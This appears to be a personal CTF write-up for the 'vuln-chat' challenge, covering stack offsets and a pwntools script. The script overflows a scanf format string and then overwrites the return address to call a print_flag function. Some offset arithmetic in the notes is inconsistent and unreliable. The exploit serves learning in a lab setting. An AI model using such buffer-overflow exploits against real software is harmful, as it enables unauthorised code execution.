![[vuln-chat]]
### Recon

![[Pasted image 20240507232048.png]]
### Walkthrough

- ![[Pasted image 20240507234651.png]]
- we can see that 2 inputs are getting using scanf usrname and pass
- fmt variable is format specifier for scanf says %30s![[Pasted image 20240507234853.png]]
- stack layout ![[Pasted image 20240507235015.png]]

- another intresting function at 0804856b ![[Pasted image 20240507235128.png]] 
### Finding Vulnerability

- as per program calls first username is got as input and then pass
- by BOF we can overwrite fmt to higher size so that for pass we can get much size
- using pass BOF we can catt print flag function

### Finding Offset
- pass can store `0x31 - 0x1d = 20` we have 10 byte extra to overflow but the offset between RIP and second input is more 
- usrname can store `0x1d - 0x9 = 20` we have 10 byte extra using this we can overwrite fmt and get more input for second variable
- ![[Pasted image 20240508000654.png]]
- let us find offset between second input and RIP ![[Pasted image 20240508000901.png]]
- ![[Pasted image 20240508000927.png]]

- offset is  ==0xffffcefc - 0xffffcecb = 49== we have only 10 bytes extra so
- offset between first input and fmt is ==0xffffcef3 - 0xffffcedf = 20==




>using first input overwrite fmt from %30 to %99 because our offset between second input stored in stack and RIP is 49
> 
  using second input by padding 49 overwrite RIP with Printflag address

### Payload

```
from pwn import *

# Establish the target process
target = process('./vuln-chat')

# Print the initial text
print target.recvuntil("username: ")

# Form the first payload to overwrite the scanf format string
payload0 = ""
payload0 += "0"*0x14 # Fill up space to format string
payload0 += "%99s" # Overwrite it with "%99s"

# Send the payload with a newline character
target.sendline(payload0)

# Print the text up to the second scanf call
print target.recvuntil("I know I can trust you?")

# From the second payload to overwrite the return address
payload1 = ""
payload1 += "1"*0x31 # Filler space to return address
payload1 += p32(0x804856b) # Address of the print_flag function

# Send the second payload with a newline character
target.sendline(payload1)

# Drop to an interactive shell to view the rest of the input
target.interactive()

```
